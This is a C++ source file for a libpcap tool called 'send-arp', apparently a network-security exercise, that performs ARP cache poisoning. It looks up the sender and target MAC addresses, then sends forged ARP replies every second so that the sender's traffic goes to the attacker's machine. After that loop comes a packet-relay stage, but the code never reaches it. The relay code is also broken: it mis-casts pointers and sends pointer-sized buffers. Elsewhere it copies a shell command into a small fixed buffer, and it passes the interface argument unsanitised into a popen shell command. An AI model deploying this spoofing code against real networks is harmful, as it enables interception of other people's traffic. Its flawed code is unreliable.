#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// myMAC capture
	ifstream iface("/sys/class/net/" + string(dev) + "/address");
  	string MY_MAC((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
 	
	// myIP capture	
	string get_ip_string = string("ifconfig ") + string(dev) \
			       + string(" | grep \"inet \" | awk -F ' ' '{print $2}'");
	char get_ip[30];
	strcpy(get_ip, get_ip_string.c_str());
	
	FILE *fp;
	fp = popen(get_ip, "r");
	fgets(errbuf, PCAP_ERRBUF_SIZE, fp);
	pclose(fp);

	// init Mac & Ip
  	Mac myMac 	= (Mac)MY_MAC;
	Mac senderMac;
	senderMac.clear();
	Mac targetMac;
	targetMac.clear();

	Ip  myIp 		= Ip(errbuf);
	Ip  senderIp 	= Ip(argv[2]);
	Ip  targetIp 	= Ip(argv[3]);
	
	// print Mac & Ip
	cout << "My 	IP  : " << string(myIp)		<< '\n';
	cout << "sender	IP  : " << string(senderIp) << '\n';
	cout << "target	IP  : " << string(targetIp) << '\n';
	cout << '\n';
	
  	cout << "My 	MAC : " << MY_MAC;

	
	// Get senderMac & targetMac
	EthArpPacket packetGet;

	packetGet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packetGet.eth_.smac_ = myMac;
	packetGet.eth_.type_ = htons(EthHdr::Arp);

	packetGet.arp_.hrd_  = htons(ArpHdr::ETHER);
	packetGet.arp_.pro_  = htons(EthHdr::Ip4);
	packetGet.arp_.hln_  = Mac::SIZE;
	packetGet.arp_.pln_  = Ip::SIZE;
	packetGet.arp_.op_   = htons(ArpHdr::Request);
	packetGet.arp_.smac_ = myMac;
	packetGet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packetGet.arp_.sip_  = htonl(myIp);
	packetGet.arp_.tip_  = htonl(senderIp);

		// broadcast
	int res_request = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetGet), sizeof(EthArpPacket));
	if (res_request != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_request, pcap_geterr(handle));
	}
	
		// senderMac & targetMac capture
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(senderMac.isNull() || targetMac.isNull()) {
		struct pcap_pkthdr* req_header; 	//time & length
		const  u_char* 	    req_packet;		//packet pointer
		int    res_pcap   = pcap_next_ex(pcap, &req_header, &req_packet);
		
		EthArpPacket *ea_packet = (EthArpPacket*)req_packet;
		if(ea_packet->arp_.sip() == senderIp)
			senderMac = ea_packet->arp_.smac();
		else if(ea_packet->arp_.tip() == senderIp)
			senderMac = ea_packet->arp_.tmac();	
		else if(ea_packet->arp_.sip() == targetIp)
			targetMac = ea_packet->arp_.smac();
		else if(ea_packet->arp_.tip() == targetIp)
			targetMac = ea_packet->arp_.tmac();
	}
  	cout << "Sender	MAC : " << string(senderMac) << '\n';
	cout << "Target	MAC : " << string(targetMac) << '\n';
	cout << '\n';

	// Arp packet	
	EthArpPacket packetArp;
	
	packetArp.eth_.dmac_ = senderMac;
	packetArp.eth_.smac_ = myMac;
	packetArp.eth_.type_ = htons(EthHdr::Arp);

	packetArp.arp_.hrd_  = htons(ArpHdr::ETHER);
	packetArp.arp_.pro_  = htons(EthHdr::Ip4);
	packetArp.arp_.hln_  = Mac::SIZE;
	packetArp.arp_.pln_  = Ip::SIZE;
	packetArp.arp_.op_   = htons(ArpHdr::Reply);
	packetArp.arp_.smac_ = myMac;
	packetArp.arp_.tmac_ = senderMac;
	packetArp.arp_.sip_  = htonl(targetIp);
	packetArp.arp_.tip_  = htonl(senderIp);

	// Send Arp packet 
	cout << "Arp send ..." << '\n';
	while(true){
		int resArp = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArp), sizeof(EthArpPacket));
		if (resArp != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", resArp, pcap_geterr(handle));
		}
		sleep(1);
	}

	// Get Spoofed Packet
	pcap_t* pcapSpoof = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(true) {
		struct pcap_pkthdr* headerSpoof;
		const  u_char*	    packetSpoof;
		int    resSpoof   = pcap_next_ex(pcapSpoof, &headerSpoof, &packetSpoof);
		
		EthHdr *ethSpoof = reinterpret_cast<EthHdr*>(&packetSpoof);	
		// Send Relay Packet
		if (ethSpoof->smac_ == senderMac){
			ethSpoof->smac_ = myMac;
			ethSpoof->dmac_ = targetMac;
		}
		int resRelay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetSpoof), sizeof(u_char*));
	}
	
	pcap_close(handle);
}
